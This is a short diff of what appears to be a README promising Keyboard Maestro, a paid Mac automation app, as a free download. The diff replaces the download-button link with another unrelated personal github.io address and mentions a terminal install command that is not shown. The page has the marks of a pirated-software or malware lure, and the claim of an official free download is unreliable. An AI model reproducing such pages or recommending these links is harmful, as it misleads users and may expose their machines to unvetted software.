@@ -4,7 +4,7 @@
 Keyboard Maestro for Mac is one of the most powerful automation tools available for macOS 🎯. It allows users to create custom macros, automate repetitive tasks, and boost productivity with just a few clicks.  
 Follow the instructions below to download and install Keyboard Maestro for free on your Mac.
 
-[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-black?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/keyboardmaestro)
+[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-black?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/keyboardmaestro)
 
 If the download button doesn’t work, you can also follow the installation process using the terminal command below.
 
